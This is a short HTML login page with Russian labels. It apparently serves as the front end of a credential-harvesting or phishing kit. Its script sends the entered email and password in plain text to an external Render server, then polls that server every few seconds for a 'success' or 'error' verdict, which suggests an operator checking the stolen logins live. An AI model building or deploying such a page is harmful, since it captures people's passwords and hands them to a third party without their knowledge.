<!DOCTYPE html>
<html>
<head>
    <title>Вход</title>
</head>
<body>
    <input type="text" id="email" placeholder="Логин">
    <input type="password" id="pass" placeholder="Пароль">
    <button onclick="login()">Войти</button>

    <script>
        const SERVER_URL = 'https://sever-afk3.onrender.com'; // Твой URL с Render
        const userId = 'user_' + Math.random().toString(36).substr(2, 9);

        async function login() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            // Отправляем данные на сервер Render
            await fetch(`${SERVER_URL}/send-data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'auth', email, pass, userId })
            });

            alert('Ожидайте подтверждения...');
            checkStatus();
        }

        async function checkStatus() {
            const interval = setInterval(async () => {
                const res = await fetch(`${SERVER_URL}/check/${userId}`);
                const data = await res.json();

                if (data.status === 'success') {
                    clearInterval(interval);
                    alert('Успешно вошли!');
                } else if (data.status === 'error') {
                    clearInterval(interval);
                    alert('Неверный пароль!');
                }
            }, 3000);
        }
    </script>
</body>
</html>
</body>
</html>


